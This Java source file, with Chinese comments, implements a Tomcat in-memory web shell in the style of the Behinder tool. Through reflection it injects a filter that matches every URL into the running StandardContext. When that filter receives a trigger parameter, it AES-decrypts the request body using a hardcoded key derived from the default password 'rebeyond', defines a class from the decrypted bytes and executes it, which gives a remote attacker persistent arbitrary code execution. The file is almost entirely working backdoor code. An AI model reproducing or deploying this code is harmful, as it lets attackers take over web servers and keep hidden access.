package x;

import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;

public class MyBehindFilter extends ClassLoader implements Filter {

    private String pwd;
    private String path;
    public static final String FILTE_NAME = "MyBehindFilter";

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public MyBehindFilter(ClassLoader classLoader) {
        super(classLoader);
    }

    public MyBehindFilter() {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        System.out.println("behind filter 执行了");
        String cmder = req.getParameter("behind");
        System.out.println("cmd is:" + cmder);
        HttpServletRequest request;
        HttpServletResponse response;
        try {
            request = (HttpServletRequest) req;
            response = (HttpServletResponse) resp;
        } catch (ClassCastException var6) {
            throw new ServletException("non-HTTP request or response");
        }
        if (cmder != null && cmder.length() > 0) {
            // String[] cmd = new String[]{"/bin/sh", "-c", cmder};
            HttpSession session = request.getSession();

            if (true) {
                try {
                    response.setContentType("text/html");
                    String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                    session.putValue("u", k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                    // new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
                    Class evilClass = new x.MyBehindFilter(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())));

                    Object o = evilClass.newInstance();
                    Method a = evilClass.getDeclaredMethod("fengyue", ServletRequest.class, ServletResponse.class, HttpSession.class);

                    a.invoke(o, request, response, session);
                } catch (Exception e) {
                    System.out.println("behind server 执行异常:" + e.toString());
                    e.printStackTrace();
                }
            }
        } else {
            chain.doFilter(req, resp);
        }
    }

    @Override
    public void destroy() {

    }

    @Override
    public boolean equals(Object object) {
        Request request = (Request) object;
        Response response = request.getResponse();
        this.pwd = request.getParameter("p");
        this.path = request.getParameter("path");
        ServletContext servletContext = request.getServletContext();
        if (this.pwd != null && this.path != null && servletContext != null) {
            dynamicAddFilter(servletContext);
        } else {
            System.out.println("inject filter failed");
        }
        return true;
    }

    public void dynamicAddFilter(ServletContext servletContext) {
        System.out.println("dynamic add filter");
        StandardContext standardContext = null;
        try {
            Field field = servletContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            // Object o=field.get(servletContext);
            // if (o instanceof javax.servlet.ServletContext) {
            //   System.out.println("servlet的context对象为属于javax.servlet.ServletContext");
            // } else if (o instanceof org.apache.catalina.core.StandardContext) {
            //   System.out.println("servlet的context对象为属于javax.servlet.StandardContext");
            // }else{
            //   System.out.println("servlet的context对象未知");
            // }

            for (; standardContext == null; ) {
                java.lang.reflect.Field contextField = servletContext.getClass()
                        .getDeclaredField("context");
                contextField.setAccessible(true);
                Object o = contextField.get(servletContext);

                if (o instanceof javax.servlet.ServletContext) {
                    servletContext = (javax.servlet.ServletContext) o;
                    System.out.println("servlet的context对象为属于javax.servlet.ServletContext");
                } else if (o instanceof org.apache.catalina.core.StandardContext) {
                    standardContext = (org.apache.catalina.core.StandardContext) o;
                    System.out.println("servlet的context对象为属于javax.servlet.StandardContext");
                }
            }
            // 获取servletContext的context成员 类型为ApplicationContext
            // ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
            // field = applicationContext.getClass().getDeclaredField("context");
            // field.setAccessible(true);
            // // 获取ApplicationContext applicationContext的context成员 类型为StandardContext
            // standardContext = (StandardContext) field.get(applicationContext);
            // standardContext.getClass()获取到的class:org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext
            // field = standardContext.getClass().getDeclaredField("filterConfigs");
            System.out
                    .println("standardContext.getClass()获取到的class:" + standardContext.getClass().getName());
            // 这里需要使用StandardContext.class.getDeclaredField("filterConfigs");而不是standardContext.getClass().getDeclaredField("filterConfigs");
            // 因为在spirng boot环境当中standardContext.getClass()获取的类是TomcatEmbeddedContext，TomcatEmbeddedContext继承了StandardContext，
            // getDeclaredField只能获取本类的private成员，不能获取父类的，导致获取filterConfigs 失败
            // field = StandardContext.class.getDeclaredField("filterConfigs");
            field=getFieldByClass(standardContext.getClass(), "filterConfigs");

            field.setAccessible(true);
            // 获取standardContext的filterConfigs 如下定义
            /**
             * The set of filter configurations (and associated filter instances) we
             * have initialized, keyed by filter name.
             */
            // private HashMap<String, ApplicationFilterConfig> filterConfigs =
            //         new HashMap<>();
            HashMap filterConfigs = (HashMap) field.get(standardContext);
            if (filterConfigs.containsKey(FILTE_NAME)) {
                // System.out.println("SimpleFilter");
                System.out.println("已经存在" + FILTE_NAME + " 内存shell");
                return;
            }

            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(FILTE_NAME);
            standardContext.addFilterDef(filterDef);

            filterDef.setFilter(this);

            // 获取ApplicationFilterConfig的filterDef构造方法
            Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig")
                    .getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            filterConfigs.put(FILTE_NAME, constructor.newInstance(standardContext, filterDef));
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/*");
            filterMap.setFilterName(FILTE_NAME);
            standardContext.addFilterMapBefore(filterMap);
            System.out.println("inject filter " + FILTE_NAME + " ok");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            System.out.println("添加filter出现异常:" + e.toString());
            e.printStackTrace();
        }


    }



    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }
        Object o=null;
        f.setAccessible(true);
        try {
           o=f.get(obj);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return o;
    }

    private Field getFieldByClass(Class cs, String fieldName) {
        Field field = null;

        while (cs != null) {
            try {
                field = cs.getDeclaredField(fieldName);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return field;
    }
}
